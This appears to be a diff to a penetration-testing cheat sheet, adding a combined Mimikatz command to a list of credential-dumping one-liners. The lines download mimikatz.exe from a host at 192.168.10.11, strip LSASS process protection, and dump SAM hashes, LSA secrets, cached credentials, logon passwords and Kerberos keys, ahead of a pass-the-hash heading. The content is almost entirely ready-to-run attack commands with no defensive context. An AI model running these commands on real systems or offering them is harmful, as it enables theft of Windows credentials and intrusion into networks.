@@ -815,6 +815,7 @@ iwr -uri http://192.168.10.11/mimikatz.exe -outfile c:\windows\tasks\m.exe
 c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::sam" "exit"
 c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "lsadump::secrets" "exit"
 c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
+c:\windows\tasks\m.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::ekeys" "!-" "exit"
 ```
 mimi pth
 ```
